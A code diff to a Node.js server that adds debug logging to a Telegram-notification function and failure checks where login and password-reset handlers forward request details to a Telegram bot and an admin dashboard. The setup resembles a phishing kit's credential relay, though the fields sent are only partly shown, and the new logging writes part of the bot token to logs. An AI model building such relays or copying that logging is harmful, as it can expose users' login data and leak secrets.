@@ -165,6 +165,7 @@ const broadcast = (data) => {
 // Send Telegram notification (Direct API integration)
 const sendTelegramNotification = async (message) => {
   console.log('📤 Attempting to send Telegram notification...');
+  console.log('📤 Message preview:', message.substring(0, 100) + '...');
   const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
   const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
   
@@ -175,21 +176,29 @@ const sendTelegramNotification = async (message) => {
   }
   
   console.log(`📤 Sending to chat_id: ${CHAT_ID}`);
+  console.log(`📤 Using bot token: ${TOKEN.substring(0, 10)}...`);
   
   try {
     const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+    console.log('📤 Telegram API URL:', url.substring(0, 50) + '...');
+    
+    const payload = {
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: 'HTML',
+      disable_web_page_preview: true
+    };
+    console.log('📤 Payload:', JSON.stringify(payload).substring(0, 150) + '...');
+    
     const response = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: 'HTML',
-        disable_web_page_preview: true
-      }),
+      body: JSON.stringify(payload),
     });
     
+    console.log('📤 Response status:', response.status);
     const data = await response.json();
+    console.log('📤 Response data:', JSON.stringify(data));
     
     if (data.ok) {
       console.log('✅ Telegram notification sent successfully!');
@@ -369,7 +378,10 @@ app.post('/login', strictLimiter, async (req, res) => {
       `🖥️ User-Agent: ${req.headers['user-agent']}`,
     ].join('\n');
 
-    await sendTelegramNotification(message);
+    const telegramResult = await sendTelegramNotification(message);
+    if (!telegramResult.ok) {
+      console.error('⚠️ Failed to send login notification to Telegram:', telegramResult.error);
+    }
 
     // Broadcast to admin dashboard
     broadcast({
@@ -436,7 +448,10 @@ app.post('/reset-password', strictLimiter, async (req, res) => {
       `🖥️ User-Agent: ${req.headers['user-agent']}`,
     ].join('\n');
 
-    await sendTelegramNotification(message);
+    const telegramResult = await sendTelegramNotification(message);
+    if (!telegramResult.ok) {
+      console.error('⚠️ Failed to send password reset notification to Telegram:', telegramResult.error);
+    }
 
     // Broadcast to admin dashboard
     broadcast({
